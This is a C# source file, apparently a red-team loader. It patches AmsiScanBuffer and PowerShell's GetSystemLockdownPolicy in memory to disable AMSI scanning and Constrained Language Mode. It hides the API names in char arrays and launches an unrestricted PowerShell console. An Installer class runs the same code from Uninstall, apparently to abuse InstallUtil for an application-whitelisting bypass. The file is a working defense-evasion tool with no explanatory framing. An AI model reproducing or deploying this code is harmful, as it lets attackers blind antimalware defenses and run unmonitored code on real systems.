
using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

namespace loader
{

    public class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        public static void Main(string[] args)
        {
            go();
        }

        public static void go()
        {
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            char[] chars = { 'a' , 'm', 's', 'i', '.', 'd', 'l', 'l'};
            String libName = string.Join("", chars);
            var blabla = LoadLibrary(libName);

            char[] chars2 = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
            String funcName = string.Join("", chars2);
            var blabla2 = GetProcAddress(blabla, funcName);
            VirtualProtect(blabla2, new UIntPtr(8), 0x40, out lpflOldProtect);

            
            if (System.IntPtr.Size == 8)
            {

                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, blabla2, 6);
            }
            else
            {

                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, blabla2, 8);
            }

            Console.WriteLine("AMSI Bypassed!");

            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
                "-exec", "bypass", "-nop"
            });
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);

            MainClass.go();
        }
    }

}
